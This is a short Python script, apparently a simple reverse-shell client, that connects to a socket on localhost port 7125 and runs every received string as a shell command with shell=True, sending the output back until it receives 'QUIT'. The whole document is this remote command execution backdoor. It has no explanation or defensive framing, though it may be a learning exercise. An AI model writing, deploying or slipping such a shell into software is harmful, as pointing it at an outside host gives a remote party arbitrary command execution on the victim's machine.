import socket
import subprocess as sub

sock = socket.socket()
sock.connect(('localhost', 7125))

while True:
    x = sock.recv(1024)
    if x.decode() == "QUIT":
        break
    elif len(x) > 0:
        print(x.decode())
        out = sub.check_output(x.decode(), shell=True)
        sock.send(out)
        print(out)
        continue
    else:
        continue
    continue